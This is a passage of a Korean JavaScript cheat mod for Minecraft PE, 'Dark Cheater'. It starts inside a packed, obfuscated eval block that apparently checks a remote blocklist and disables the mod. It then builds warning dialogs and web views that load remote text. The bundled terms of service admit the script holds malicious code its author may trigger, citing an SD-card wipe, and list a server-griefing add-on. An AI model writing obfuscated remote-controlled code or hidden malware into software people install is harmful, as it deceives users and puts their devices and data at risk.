a="\\k\\g\\f\\1g\\B\\b\\c\\z\\i\\i\\j\\B\\1e\\t\\b\\o\\t\\b\\M\\b\\i\\c\\j\\y\\f\\h\\c\\b\\f\\q\\b\\b\\o\\f\\z\\h\\m\\i\\g\\k\\m\\F\\b\\b\\o\\G\\s\\k\\c\\h\\b\\f\\h\\c\\J\\1c\\h\\l\\b\\j\\h\\p\\c\\f\\c\\N\\c\\p\\t\\b\\c\\f\\j\\o\\j\\p\\q\\c\\f\\p\\s\\k\\c\\h\\b\\f\\y\\c\\b\\q\\g\\m\\l\\f\\F\\b\\b\\o\\1b\\c\\b\\f\\x\\c\\b\\1a\\h\\b\\k\\b\\B\\f\\J\\i\\k\\b\\c\\Z\\g\\f\\p\\s\\g\\l\\c\\f\\b\\g\\M\\b\\i\\k\\h\\x\\f\\l\\o\\s\\k\\b\\f\\l\\j\\W\\c\\f\\b\\g\\j\\l\\b\\f\\t\\l\\c\\i\\z\\x\\c\\h\\b\\f\\q\\b\\b\\o\\T\\u\\u\\m\\j\\i\\A\\b\\g\\i\\h\\j\\m\\g\\v\\m\\g\\b\\q\\g\\y\\c\\v\\p\\g\\v\\A\\i\\u\\C\\C\\C\\S\\u\\m\\j\\i\\A\\G\\q\\c\\j\\b\\c\\i\\v\\b\\N\\b\\f\\k\\h\\Q\\g\\O".Y("\\f");P=E;R{a[w]=I U[a[0]][a[1]]();V[a[2]][a[3]][a[4]][a[5]](a[18])[a[6]](I X[a[7]][a[3]][a[8]][a[9]][a[10]](a[19]))[a[11]]()[a[12]](a[w]);a[w][a[13]]();a[H]=17(a[w][a[14]]());a[D]=a[H][a[14]]()[a[15]]("d");a[r]=E;1d(K n 1f a[D]){L(a[D][n]==1h){a[r]=1i;1j}}L(a[r]){1k()}1l[a[16]](a[1m],a[r]);1n(a[r])}1o(e){}',62,87,'||||||||||nox|x74|x65|||xXY|x6F|x6E|x72|x61|x69|x73|x64||x70|x63|x68|24|x6C|x75|x2F|x2E|21|x67|x6D|x41|x6B|x79|x30|23|true|x48|x43|22|new|x77|var|if|x53|x78|x32|darkCheaterActive|x66|try|x2B|x3A|java|android|x76|org|split|x54||||||||String|||x45|x47|x49|for|x4F|in|x42|version|false|break|alertMessage|Dark|20|hyperCheck|catch'.split('|'),0,{});
eval(code);
}


function alertMessage(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var text = new android.widget.TextView(ctx);
text.setText("이 버전의 Dark Cheater(버전 "+version+")는 무단 공유 등의 이유로 제작자가 작동을 차단해서 작동하지 않습니다. 제작자의 블로그에서 최신 버전을 받아 주세요.");
text.setTextSize(17);
text.setTextColor(white);
layout.addView(text);
var maker = new android.widget.TextView(ctx);
maker.setText("\n© 2015 Dark Tornado, All rights reserved.\n");
maker.setTextSize(11);
maker.setTextColor(white);
maker.setGravity(android.view.Gravity.CENTER);
layout.addView(maker);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("Dark Cheater 경고");
dialog.setNegativeButton("확인", null);
dialog.setNeutralButton("차단 이유", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
showMessage();
}
}));
dialog.setPositiveButton("제작자 블로그", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
var uri = new android.net.Uri.parse("http:\/\/blog.naver.com\/dt3141592");
var link = new android.content.Intent(android.content.Intent.ACTION_VIEW, uri);
ctx.startActivity(link);
}
}));
dialog.show();
var noti = new android.app.Notification.Builder(ctx);
noti.setSmallIcon(android.R.drawable.ic_menu_info_details);
noti.setContentTitle("Dark Cheater 경고");
noti.setContentText("이 버전의 Dark Cheater는 더 이상 작동하지 않습니다.");
noti.setContentInfo("Dark Cheater "+version);
noti.setOngoing(false);
ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE).notify(1, noti.getNotification());
}
catch (e){
Dark.toast(e+", "+e.lineNumber);
}
}
}));
}


function showMessage(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loadWeb = new android.webkit.WebView(ctx);
loadWeb.setWebChromeClient(new android.webkit.WebChromeClient());
loadWeb.setWebViewClient(new android.webkit.WebViewClient());
loadWeb.loadUrl("http:\/\/darktornado.dothome.co.kr\/000+\/dcm\/"+version+".txt");
layout.addView(loadWeb);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("다크 치터 "+version+" 차단 이유");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function hyperCheck(block){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
hyperCheckEnabled = false;
if(net.zhuoweizhang.mcpelauncher.Utils.isPro()) var path = "/data/data/net.zhuoweizhang.mcpelauncher.pro/";
else var path = "/data/data/net.zhuoweizhang.mcpelauncher/";
var folder = new java.io.File(path+"darkCheater/");
folder.mkdir();
if(block) Dark.hyperSave("blockData", version);
else Dark.hyperSave("blockData", false);
}
catch(e){
Dark.toast(e+", "+e.lineNumber);
}
}
}));
}


function showTerms(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("Dark Cheater 이용 약관");
dialog.setMessage("제1조. 정의 외\n\n1항. 이 ModPE 스크립트의 공식 명칭은 \"Dark Cheater\"와 \"다크 치터\"이며, 공식 줄임말을 \"닼치\"이다.\n2항. 1항에서의 공식 명칭이 아닌 \"다크 치트\" 등은 비공식 명칭이다.\n3항. 다크 치터의 제작자는 Dark Tornado(이하 제작자)이며, 모든 저작권은 제작자에게 있다.\n4항. 다크 치터와 연동이 가능한 스크립트는 \"Dark Cheater Addon\" 또는 \"다크 치터 애드온\"이라고 부른다.\n5항. 다크 치터를 제작자의 블로그, 다크 치터 공식 홈페이지 또는 제작자에게 직접 받은 자들을 \"사용자\"라고 정의한다.\n6항. 5항의 방법이 아닌 다른 방법으로 다크 치터를 받은 자들은 \"부당한 사용자\"라고 정의한다.\n7항. 다크 치터의 공식 홈페이지의 주소는 \"http:\/\/darktornado.dothome.co.kr\/darkCheater\"이다.\n8항. 다크 치터는 테러 스크립트가 아니다.\n\n\n제2조. 제작자의 권한\n\n1항. 제작자는 특정 다크 치터를 차단할 수 있다.\n2항. 제작자는 정당한 이유가 있다면 모든 다크 치터가 작동하지 않도록 차단하거나 개발을 중단할 수 있다.\n3항. 제작자는 다크 치터 내부의 악성코드를 사용할 권한이 있으나, 되도록 SD 카드 초기화와 같은 좋지 않은 일에는 사용하지 않아야 한다.\n4항. 제작자는 악성 코드 및 원격 수정 다이얼로그로 사용자들에게 메시지를 전달할 수 있다.\n\n\n제3조. 사용자의 권한 및 금지 항목\n\n1항. 사용자는 차단이 되지 않은 다크 치터를 자유롭게 사용할 수 있다.\n2항. 사용자는 다크 치터를 리뷰할 수 있다.\n3항. 사용자는 다크 치터의 소스 중 난독화(암호화)가 되지 않은 부분의 소스를 참고할 수 있다.\n4항. 사용자는 다크 치터를 배포 및 판매할 수 없다.\n5항. 사용자는 다크 치터의 소스를 무단으로 수정해서는 안된다.\n6항. 1항 ~ 3항은 부당한 사용자들에게는 해당되지 않는다.\n\n\n제4조. Dark Cheater Addon\n\n1항. 모든 Dark Cheater Addon은 명령어 \"\/link off\"로 내용을 연동을 해제할 수 있다.\n2항. Dark Cheater Addon 목록\n  - 테러 도우미(3.0 ~ 6.0)\n  - Dark Cheater 개발자 기능\n  - Dark Cheater TRA 추가 기능\n  - Dark Cheater Addon - Client World Edit Plus\n  - Dark Cheater Addon - The Seed\n  - Dark Cheater Addon - Nusty\n3항. 테러 도우미는 서버 테러를 위한 스크립트로서, 블록런처 1.12.1 이상은 지원하지 않는다\n4항. Dark Cheater 개발자 기능은 제작자가 사용하기 위한 기능들만 따로 분리한 것이다.\n5항. Dark Cheater TRA 추가 기능은 테러 연구회(TRA) 회원들만을 위한 기능이다.\n\n\n제5조. 효력 외\n\n1항. 이 약관은 다크 치터를 한 번이라도 사용한 자들과 제작자에게 적용된다.\n2항. 이 약관은 이후에 예고 없이 수정될 수 있다.\n\n\nⓒ 2015 Dark Tornado, All rights reserved.");
if(tf){
dialog.setNegativeButton("거절", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(btn!=null){
btn.dismiss();
btn = null;
}
Dark.toast("약관에 동의하셔야 다크 치터를 사용하실 수 있습니다.");
}
}));
dialog.setPositiveButton("동의", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Dark.makeButton();
Dark.save("info5", true);
Dark.toast("약관에 동의하셨습니다.\n 이제 다크 치터를 사용하실 수 있습니다.");
}
}));
}
else{
dialog.setNegativeButton("닫기", null);
}
dialog.setCancelable(false);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showTermsWeb(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loadWeb = new android.webkit.WebView(ctx);
loadWeb.setWebChromeClient(new android.webkit.WebChromeClient());
loadWeb.setWebViewClient(new android.webkit.WebViewClient());
loadWeb.loadUrl("http:\/\/darktornado.dothome.co.kr\/darkCheater/darkCheaterTerms.txt");
layout.addView(loadWeb);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("Dark Cheater 이용 약관");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}

